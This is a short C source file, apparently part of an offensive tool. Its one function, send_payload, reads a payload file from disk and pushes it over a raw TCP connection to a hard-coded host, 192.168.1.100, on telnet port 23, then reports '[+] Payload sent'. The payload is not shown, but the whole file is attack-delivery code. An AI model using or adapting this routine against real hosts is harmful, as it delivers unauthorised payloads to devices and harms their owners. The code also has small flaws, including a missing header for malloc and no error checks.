#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "utils.h"

void send_payload(const char *payload_path) {
    FILE *fp = fopen(payload_path, "rb");
    if (!fp) {
        log_error("Payload file missing");
        return;
    }
    
    fseek(fp, 0, SEEK_END);
    long size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    char *payload = malloc(size);
    fread(payload, 1, size, fp);
    fclose(fp);
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in target = {0};
    target.sin_family = AF_INET;
    target.sin_port = htons(23);
    inet_pton(AF_INET, "192.168.1.100", &target.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&target, sizeof(target)) == 0) {
        send(sock, payload, size, 0);
        printf("[+] Payload sent to 192.168.1.100\n");
    } else {
        log_error("Payload delivery failed");
    }
    
    free(payload);
    close(sock);
}
